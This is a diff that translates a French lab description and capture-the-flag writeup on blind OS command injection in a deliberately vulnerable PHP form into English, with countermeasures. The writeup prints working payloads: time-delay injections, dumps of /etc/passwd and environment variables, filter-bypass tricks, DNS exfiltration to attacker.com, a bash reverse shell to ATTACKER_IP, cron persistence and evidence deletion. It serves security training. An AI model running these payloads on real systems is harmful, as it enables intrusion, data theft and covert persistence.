@@ -1,132 +1,132 @@
 # OS Command Injection with Time Delays - Lab Description
 
-## Vue d'ensemble
+## Overview
 
-Ce laboratoire présente une vulnérabilité d'injection de commandes OS aveugle (blind) dans une application web PHP. L'application exécute des commandes shell contenant des données fournies par l'utilisateur sans validation appropriée.
+This laboratory presents a blind OS command injection vulnerability in a PHP web application. The application executes shell commands containing user-provided data without proper validation.
 
-## Architecture de l'Application
+## Application Architecture
 
-### Technologies Utilisées
-- **Backend**: PHP 8.1 avec Apache
-- **Frontend**: HTML5, TailwindCSS (thème sombre)
-- **Containerisation**: Docker avec docker-compose
+### Technologies Used
+- **Backend**: PHP 8.1 with Apache
+- **Frontend**: HTML5, TailwindCSS (dark theme)
+- **Containerization**: Docker with docker-compose
 - **Port**: 3206
 
-### Structure de l'Application
-- **Page d'accueil** (`index.php`): Présentation de l'entreprise TechCorp
-- **Système de feedback** (`feedback.php`): Formulaire vulnérable à l'injection de commandes
-- **Panneau d'administration** (`admin.php`): Interface de monitoring
+### Application Structure
+- **Home page** (`index.php`): TechCorp company presentation
+- **Feedback system** (`feedback.php`): Form vulnerable to command injection
+- **Administration panel** (`admin.php`): Monitoring interface
 
-## Vulnérabilité
+## Vulnerability
 
-### Localisation
-La vulnérabilité se trouve dans le fichier `feedback.php` à la ligne 15-17 :
+### Location
+The vulnerability is located in the `feedback.php` file at lines 15-17:
 
 ```php
 $email_validation_cmd = "echo 'Validating email: " . $email . "'";
 $output = shell_exec($email_validation_cmd);
 ```
 
-### Mécanisme
-1. L'utilisateur soumet un formulaire de feedback
-2. Le paramètre `email` est directement concaténé dans une commande shell
-3. La commande est exécutée via `shell_exec()`
-4. Aucune validation ou échappement n'est effectué
+### Mechanism
+1. User submits a feedback form
+2. The `email` parameter is directly concatenated into a shell command
+3. The command is executed via `shell_exec()`
+4. No validation or escaping is performed
 
-### Type de Vulnérabilité
-- **Blind OS Command Injection**: L'output de la commande n'est pas retourné dans la réponse
-- **Time-based exploitation**: L'exploitation se fait via des délais temporels
+### Vulnerability Type
+- **Blind OS Command Injection**: Command output is not returned in the response
+- **Time-based exploitation**: Exploitation is done via time delays
 
 ## Exploitation
 
-### Objectif
-Causer un délai de 10 secondes pour confirmer l'exécution de commandes arbitraires.
+### Objective
+Cause a 10-second delay to confirm execution of arbitrary commands.
 
-### Payload d'Exploitation
+### Exploitation Payload
 ```
 x||ping+-c+10+127.0.0.1||
 ```
 
-### Explication du Payload
-- `x`: Valeur factice pour le premier echo
-- `||`: Opérateur OR logique pour exécuter la commande suivante
-- `ping+-c+10+127.0.0.1`: Commande ping avec 10 paquets vers localhost
-- `||`: Opérateur OR pour continuer l'exécution
+### Payload Explanation
+- `x`: Dummy value for the first echo
+- `||`: Logical OR operator to execute the next command
+- `ping+-c+10+127.0.0.1`: Ping command with 10 packets to localhost
+- `||`: OR operator to continue execution
 
-### Autres Payloads Possibles
+### Other Possible Payloads
 ```
 x||sleep+10||
 x||curl+-m+10+http://127.0.0.1:9999||
 x||nc+-w+10+127.0.0.1+80||
 ```
 
-## Méthodes de Détection
+## Detection Methods
 
 ### 1. Time-based Detection
-- Soumettre des payloads avec des délais croissants
-- Observer les temps de réponse
-- Confirmer l'exécution par les délais
+- Submit payloads with increasing delays
+- Observe response times
+- Confirm execution through delays
 
 ### 2. Out-of-band Detection
-- Utiliser des commandes qui génèrent du trafic réseau
-- Monitorer les logs réseau
-- Utiliser des services externes (DNS, HTTP)
+- Use commands that generate network traffic
+- Monitor network logs
+- Use external services (DNS, HTTP)
 
 ### 3. Error-based Detection
-- Tester des commandes qui génèrent des erreurs
-- Observer les messages d'erreur dans les logs
-- Analyser les réponses d'erreur
+- Test commands that generate errors
+- Observe error messages in logs
+- Analyze error responses
 
-## Contre-mesures
+## Countermeasures
 
-### 1. Validation d'Entrée
+### 1. Input Validation
 ```php
-// Validation stricte des emails
+// Strict email validation
 if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    die("Email invalide");
+    die("Invalid email");
 }
 ```
 
-### 2. Échappement des Caractères
+### 2. Character Escaping
 ```php
-// Échappement des caractères spéciaux
+// Escape special characters
 $email = escapeshellarg($email);
 ```
 
-### 3. Utilisation d'Alternatives Sûres
+### 3. Use Safe Alternatives
 ```php
-// Utiliser des fonctions PHP natives au lieu de shell_exec
+// Use native PHP functions instead of shell_exec
 $email_parts = explode('@', $email);
 $domain = $email_parts[1] ?? '';
 ```
 
-### 4. Liste Blanche
+### 4. Whitelist
 ```php
-// Autoriser seulement les domaines connus
+// Allow only known domains
 $allowed_domains = ['example.com', 'company.com'];
 if (!in_array($domain, $allowed_domains)) {
-    die("Domaine non autorisé");
+    die("Unauthorized domain");
 }
 ```
 
-## Scénarios d'Apprentissage
+## Learning Scenarios
 
-### Niveau Débutant
-- Comprendre le concept d'injection de commandes
-- Identifier les points d'injection
-- Tester des payloads simples
+### Beginner Level
+- Understand command injection concepts
+- Identify injection points
+- Test simple payloads
 
-### Niveau Intermédiaire
-- Exploiter des vulnérabilités blind
-- Utiliser des techniques time-based
-- Éviter les filtres de sécurité
+### Intermediate Level
+- Exploit blind vulnerabilities
+- Use time-based techniques
+- Bypass security filters
 
-### Niveau Avancé
-- Développer des payloads personnalisés
-- Contourner les WAF
-- Exfiltration de données via OOB
+### Advanced Level
+- Develop custom payloads
+- Bypass WAF
+- Data exfiltration via OOB
 
-## Ressources Additionnelles
+## Additional Resources
 
 - [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
 - [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
@@ -134,154 +134,154 @@ if (!in_array($domain, $allowed_domains)) {
 
 ---
 
-# 🎯 WRITEUP COMPLET - Solution Détaillée
+# 🎯 COMPLETE WRITEUP - Detailed Solution
 
-## Étape 1 : Reconnaissance
+## Step 1: Reconnaissance
 
-### 1.1 Analyse de l'Application
-L'application présente trois pages principales :
-- **Page d'accueil** : Présentation de TechCorp
-- **Formulaire de feedback** : Point d'entrée vulnérable
-- **Panneau d'administration** : Interface de monitoring
+### 1.1 Application Analysis
+The application presents three main pages:
+- **Home page**: TechCorp presentation
+- **Feedback form**: Vulnerable entry point
+- **Administration panel**: Monitoring interface
 
-### 1.2 Identification de la Vulnérabilité
-En analysant le code source de `feedback.php`, on identifie la vulnérabilité :
+### 1.2 Vulnerability Identification
+By analyzing the source code of `feedback.php`, we identify the vulnerability:
 
 ```php
 $email_validation_cmd = "echo 'Validating email: " . $email . "'";
 $output = shell_exec($email_validation_cmd);
 ```
 
-Le paramètre `$email` est directement concaténé dans une commande shell sans validation.
+The `$email` parameter is directly concatenated into a shell command without validation.
 
-## Étape 2 : Exploitation
+## Step 2: Exploitation
 
-### 2.1 Test de Base
-Commencer par tester si l'injection fonctionne :
+### 2.1 Basic Test
+Start by testing if injection works:
 
-**Payload de test :**
+**Test payload:**
 ```
 test@example.com; whoami
 ```
 
-**Résultat :** Aucune sortie visible (blind injection)
+**Result:** No visible output (blind injection)
 
 ### 2.2 Confirmation via Time-based
-Utiliser un délai pour confirmer l'exécution :
+Use a delay to confirm execution:
 
-**Payload de confirmation :**
+**Confirmation payload:**
 ```
 test@example.com; sleep 5
 ```
 
-**Résultat :** Délai de 5 secondes observé
+**Result:** 5-second delay observed
 
-### 2.3 Exploitation avec Redirection
-Utiliser la redirection de sortie pour extraire des informations :
+### 2.3 Exploitation with Redirection
+Use output redirection to extract information:
 
-**Payload pour extraire /etc/passwd :**
+**Payload to extract /etc/passwd:**
 ```
 test@example.com; cat /etc/passwd > /var/www/html/passwd.txt
 ```
 
-**Accès au fichier :**
+**File access:**
 ```
 http://localhost:3206/passwd.txt
 ```
 
-## Étape 3 : Exfiltration de Données
+## Step 3: Data Exfiltration
 
-### 3.1 Extraction de Fichiers Système
+### 3.1 System File Extraction
 ```bash
-# Liste des utilisateurs
+# User list
 test@example.com; cat /etc/passwd > /var/www/html/users.txt
 
-# Informations système
+# System information
 test@example.com; uname -a > /var/www/html/system.txt
 
-# Liste des processus
+# Process list
 test@example.com; ps aux > /var/www/html/processes.txt
 
-# Variables d'environnement
+# Environment variables
 test@example.com; env > /var/www/html/environment.txt
 ```
 
-### 3.2 Exploration du Système de Fichiers
+### 3.2 File System Exploration
 ```bash
-# Lister le répertoire courant
+# List current directory
 test@example.com; ls -la > /var/www/html/current_dir.txt
 
-# Explorer /etc
+# Explore /etc
 test@example.com; ls -la /etc > /var/www/html/etc_contents.txt
 
-# Chercher des fichiers sensibles
+# Search for sensitive files
 test@example.com; find / -name "*.conf" -type f 2>/dev/null > /var/www/html/config_files.txt
 ```
 
-## Étape 4 : Techniques Avancées
+## Step 4: Advanced Techniques
 
-### 4.1 Bypass de Filtres
-Si des filtres sont en place, utiliser des techniques de contournement :
+### 4.1 Filter Bypass
+If filters are in place, use bypass techniques:
 
 ```bash
-# Encodage URL
+# URL encoding
 test@example.com; cat /etc/passwd | base64 > /var/www/html/passwd_b64.txt
 
-# Utilisation de variables
+# Variable usage
 test@example.com; a=cat; b=/etc/passwd; $a $b > /var/www/html/passwd_var.txt
 
 # Concatenation
 test@example.com; c"a"t /etc/passwd > /var/www/html/passwd_concat.txt
 ```
 
-### 4.2 Exfiltration via DNS
+### 4.2 DNS Exfiltration
 ```bash
-# Utiliser nslookup pour exfiltrer des données
+# Use nslookup to exfiltrate data
 test@example.com; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
 ```
 
-### 4.3 Reverse Shell (Optionnel)
+### 4.3 Reverse Shell (Optional)
 ```bash
-# Créer un reverse shell
+# Create a reverse shell
 test@example.com; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
 ```
 
-## Étape 5 : Post-Exploitation
+## Step 5: Post-Exploitation
 
-### 5.1 Élévation de Privilèges
+### 5.1 Privilege Escalation
 ```bash
-# Vérifier les permissions sudo
+# Check sudo permissions
 test@example.com; sudo -l > /var/www/html/sudo_perms.txt
 
-# Chercher des fichiers SUID
+# Search for SUID files
 test@example.com; find / -perm -4000 2>/dev/null > /var/www/html/suid_files.txt
 ```
 
-### 5.2 Persistance
+### 5.2 Persistence
 ```bash
-# Créer un cron job
+# Create a cron job
 test@example.com; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
 ```
 
-## Étape 6 : Nettoyage et Documentation
+## Step 6: Cleanup and Documentation
 
-### 6.1 Suppression des Fichiers de Preuve
+### 6.1 Evidence File Removal
 ```bash
-# Supprimer les fichiers créés
+# Remove created files
 test@example.com; rm -f /var/www/html/*.txt
 ```
 
-### 6.2 Documentation de l'Exploit
-Documenter tous les payloads utilisés et les résultats obtenus pour référence future.
+### 6.2 Exploit Documentation
+Document all used payloads and obtained results for future reference.
 
-## 🔧 Outils Recommandés
+## 🔧 Recommended Tools
 
-### Outils de Test
-- **Burp Suite** : Interception et modification des requêtes
-- **OWASP ZAP** : Scanner de vulnérabilités
-- **Nmap** : Découverte de ports et services
+### Testing Tools
+- **Burp Suite**: Request interception and modification
+- **OWASP ZAP**: Vulnerability scanner
+- **Nmap**: Port and service discovery
 
-### Scripts d'Automatisation
+### Automation Scripts
 ```python
 import requests
 import time
@@ -299,82 +299,82 @@ def test_injection(payload):
     
     return end_time - start_time
 
-# Test de délai
+# Delay test
 delay = test_injection('test@example.com; sleep 5')
-print(f"Délai observé : {delay} secondes")
+print(f"Observed delay: {delay} seconds")
 ```
 
-## 🛡️ Contre-mesures Recommandées
+## 🛡️ Recommended Countermeasures
 
-### 1. Validation Stricte
+### 1. Strict Validation
 ```php
-// Validation d'email stricte
+// Strict email validation
 if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    die("Email invalide");
+    die("Invalid email");
 }
 
-// Liste blanche de domaines
+// Domain whitelist
 $allowed_domains = ['example.com', 'company.com'];
 $domain = substr(strrchr($email, "@"), 1);
 if (!in_array($domain, $allowed_domains)) {
-    die("Domaine non autorisé");
+    die("Unauthorized domain");
 }
 ```
 
-### 2. Échappement Approprié
+### 2. Proper Escaping
 ```php
-// Utiliser escapeshellarg pour tous les inputs
+// Use escapeshellarg for all inputs
 $email = escapeshellarg($email);
 $name = escapeshellarg($name);
 $message = escapeshellarg($message);
 ```
 
-### 3. Alternatives Sûres
+### 3. Safe Alternatives
 ```php
-// Utiliser des fonctions PHP natives
+// Use native PHP functions
 $email_parts = explode('@', $email);
 $domain = $email_parts[1] ?? '';
 
-// Validation de domaine
+// Domain validation
 if (!checkdnsrr($domain, 'MX')) {
-    die("Domaine invalide");
+    die("Invalid domain");
 }
 ```
 
-### 4. Monitoring et Logging
+### 4. Monitoring and Logging
 ```php
-// Logger toutes les tentatives d'injection
+// Log all injection attempts
 $suspicious_patterns = [';', '|', '&', '`', '$('];
 foreach ($suspicious_patterns as $pattern) {
     if (strpos($email, $pattern) !== false) {
-        error_log("Tentative d'injection détectée: " . $email);
-        die("Caractère non autorisé détecté");
+        error_log("Injection attempt detected: " . $email);
+        die("Unauthorized character detected");
     }
 }
 ```
 
-## 📊 Métriques de Sécurité
+## 📊 Security Metrics
 
-### Temps de Réponse
-- **Normal** : < 1 seconde
-- **Injection détectée** : > 5 secondes
-- **Exploitation réussie** : Délai correspondant au payload
+### Response Time
+- **Normal**: < 1 second
+- **Injection detected**: > 5 seconds
+- **Successful exploitation**: Delay corresponding to payload
 
-### Fichiers Créés
-- **passwd.txt** : Liste des utilisateurs
-- **system.txt** : Informations système
-- **processes.txt** : Processus en cours
-- **environment.txt** : Variables d'environnement
+### Created Files
+- **passwd.txt**: User list
+- **system.txt**: System information
+- **processes.txt**: Running processes
+- **environment.txt**: Environment variables
 
-## 🎯 Objectifs d'Apprentissage Atteints
+## 🎯 Learning Objectives Achieved
 
-✅ **Compréhension des injections aveugles**
-✅ **Maîtrise des techniques de redirection**
-✅ **Exploitation time-based**
-✅ **Exfiltration de données**
-✅ **Contournement de filtres**
+✅ **Understanding of blind injections**
+✅ **Mastery of redirection techniques**
+✅ **Time-based exploitation**
+✅ **Data exfiltration**
+✅ **Filter bypass**
 ✅ **Post-exploitation**
 
 ---
 
-*Ce writeup démontre une exploitation complète de la vulnérabilité d'injection de commande OS aveugle avec redirection de sortie.* 
+*This writeup demonstrates a complete exploitation of the blind OS command injection vulnerability with output redirection.* 
